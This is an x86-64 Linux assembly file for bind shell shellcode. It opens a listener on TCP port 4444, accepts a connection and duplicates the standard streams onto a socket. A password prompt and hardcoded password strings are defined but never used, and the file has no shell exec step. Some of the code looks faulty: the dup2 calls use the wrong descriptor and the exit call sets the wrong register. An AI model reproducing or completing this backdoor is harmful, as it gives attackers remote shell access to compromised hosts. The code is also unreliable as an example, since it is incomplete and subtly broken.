global _start

section .text

_start:
	mov rbp, rsp		; Set stack base
	jmp _data		; Find string address

_main:
	pop r15 		; Keep reference to strings

; Build a server sockaddr_struct on the stack
	xor rax, rax
	push rax
	add ax, 0x5c11
	shl rax, 16
	add ax, 2
	push rax
	
; Create Socket
	xor rax, rax
	mov rdx, rax
	inc rax
	mov rsi, rax	; SOCK_STREAM (1)
	inc rax
	mov rdi, rax	; AF_INET (2)
	add rax, 39	; SysCall 41
	syscall
	cmp rax, -1
	jle _exit
	push rax ; Store socket id on stack

_bind: ; Bind the Socket
	mov rdi, [rbp-24] ; svr_sock id
	lea rsi, [rbp-16]  ; sockaddr_in struct
	mov rdx, 16	; sockaddr_in size
	xor rax, rax
	add rax, 49
	syscall
	cmp rax, -1
	jle _exit

; Listen
	xor rax, rax
	add rax, 2
	mov rsi, rax
	add rax, 48
	syscall
	cmp rax, -1
	jle _exit
	nop

	mov rax, 0
	push rax
	push rax

_accept:	; Accept a connection
	lea rsi, [rbp-40]
	mov rax, 43
	syscall
	cmp rax, -1
	jle _exit
	push rax
	nop

_dup:
	mov r8, 33
	mov rax, r8
	xor rsi, rsi
	syscall 

	mov rax, r8
	inc rsi
	syscall

	mov rax, r8
	inc rsi
	syscall

	nop

_exit:
	mov rax, 0x3c
	mov rbx, 1
	syscall	
	nop
_data:
	call _main
	prompt: db "Speak friend and enter: "
	pass:	db "password", 0xa
	good:	db "Welcome", 0xa
	bad:	db "Wrong", 0xa
	



